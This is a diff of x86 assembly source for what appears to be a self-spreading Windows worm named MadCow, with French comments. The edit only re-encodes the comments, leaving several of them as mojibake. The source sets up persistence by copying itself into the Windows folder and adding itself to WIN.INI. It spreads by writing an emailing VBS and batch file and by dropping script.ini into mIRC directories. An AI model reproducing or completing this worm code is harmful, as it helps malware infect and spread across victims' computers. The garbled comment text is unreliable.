@@ -110,7 +110,7 @@ include icone.inc
 
 .code
 DEBUT:
-VERIF:  mov  eax,offset CLE             ; V‚rifie si il existe une cl‚
+VERIF:  mov  eax,offset CLE             ; Vâ€šrifie si il existe une clâ€š
         call REG                        ; [Atchoum] dans HKLM\Software.
         cmp  [regDisp],1                ; Si elle n'y est pas, 
         jne  INIFILE                     ; on installe les composants
@@ -133,7 +133,7 @@ COPIE:  push 0                          ;
         call CopyFileA                  ;
         push 260                        ; puis
         push offset szCopi2             ;
-        call GetWindowsDirectoryA       ; … nouveau dans le dossier WINDOWS
+        call GetWindowsDirectoryA       ; â€¦ nouveau dans le dossier WINDOWS
         push offset Copie2              ;
         push offset szCopi2             ;
         call lstrcat                    ; sous le nom de MadCow.exe
@@ -148,16 +148,16 @@ WIN_INI:push 260                        ; Pour lancer le programme, on peut
         push offset Winini              ;
         push offset szWin               ; fichier WIN.INI dans le dossier
         call lstrcat                    ;
-        push offset szWin               ; WINDOWS. La d‚marche est simple :
+        push offset szWin               ; WINDOWS. La dâ€šmarche est simple :
         push offset szCopie             ; [windows]
         push offset run                 ; run="nom du programme"
         push offset windows             ;
         call WritePrivateProfileStringA ;
 
-DIR:    push 00h                        ; On cr‚e ici C:\Win32
+DIR:    push 00h                        ; On crÃ©e ici C:\Win32
         push offset Dossier             ;
         call CreateDirectoryA           ;
-EMAIL  :push 00000000h                  ; On va cr‚er C:\Win32\ENVOIE.VBS
+EMAIL  :push 00000000h                  ; On va crÃ©er C:\Win32\ENVOIE.VBS
         push 00000080h                  ;
         push 00000002h                  ; 
         push 00000000h                  ;
@@ -176,7 +176,7 @@ EMAIL  :push 00000000h                  ; On va cr‚er C:\Win32\ENVOIE.VBS
         call CloseHandle                ;
 EXEC   :push 00000000h                  ; et C:\Win32\ENVOIE.BAT
         push 00000080h                  ;
-        push 00000002h                  ; qui va ‚x‚cuter ENVOIE.VBS
+        push 00000002h                  ; qui va exÃ©cuter ENVOIE.VBS
         push 00000000h                  ;
         push 00000001h                  ;
         push 40000000h                  ;
@@ -207,7 +207,7 @@ REG:    push offset regDisp             ;
         call RegCloseKey                ;
         ret                             ;
 
-INIFILE:push 00000000h                  ; On va cr‚er dans C:\Win32
+INIFILE:push 00000000h                  ; On va crÃ©er dans C:\Win32
         push 00000001h                  ;
         push 00000002h                  ; le fichier script.ini
         push 00000000h                  ;
@@ -226,14 +226,14 @@ INIFILE:push 00000000h                  ; On va cr‚er dans C:\Win32
         call CloseHandle                ;
 
         push 00h                        ; On va copier ce fichier dans les
-        push offset script1             ; r‚pertoire suivant :
+        push offset script1             ; rÃ©pertoire suivant :
         push offset fileini             ; 
         call CopyFileA                  ; C:\mirc C:\mirc32
         test eax,eax                    ; C:\program files\mirc et dans
         jnz  COPYWIN                    ; C:\program files\mirc32
         push 00h                        ;
-        push offset script2             ; Si il arrive … se copier dans un
-        push offset fileini             ; de ces fichier, il va cr‚er une
+        push offset script2             ; Si il arrive â€¦ se copier dans un
+        push offset fileini             ; de ces fichier, il va crÃ©er une
         call CopyFileA                  ; copie du programme dans C:\Win32
         test eax,eax                    ; le nom MadCow.exe
         jnz  COPYWIN                    ;
@@ -262,7 +262,7 @@ COPYWIN:push 0                          ;
         call CopyFileA                  ;
         jmp  FIN                        ;
 
-ICOFILE:push 00000000h                  ; On va cr‚er … la base du disque
+ICOFILE:push 00000000h                  ; On va crÃ©er â€¦ la base du disque
         push 00000080h                  ;
         push 00000002h                  ; dur le fichier Salut.ico
         push 00000000h                  ;
@@ -279,7 +279,7 @@ ICOFILE:push 00000000h                  ; On va cr‚er … la base du disque
         call WriteFile                  ;
         push [fh]                       ;
         call CloseHandle                ;
-        push 260                        ; On d‚place le fichier Salut.ico
+        push 260                        ; On dâ€šplace le fichier Salut.ico
         push offset szCico              ; 
         call GetSystemDirectoryA        ; dans le dossier SYSTEM sous
         push offset Copico              ; 
@@ -310,7 +310,7 @@ REG2:   push offset l                   ;
         call RegCloseKey                ; FERME LA BASE DE REGISTRE
         jmp  FIN                        ; PUIS TERMINE LE PROGRAMME
 
-EXECBAT:push 01h                        ; On ‚x‚cute le fichier ENVOIE.BAT
+EXECBAT:push 01h                        ; On exÃ©cute le fichier ENVOIE.BAT
         push offset BATFILE             ;
 	call WinExec			;
 FIN:    push 00h                        ; FIN DU PROGRAMME
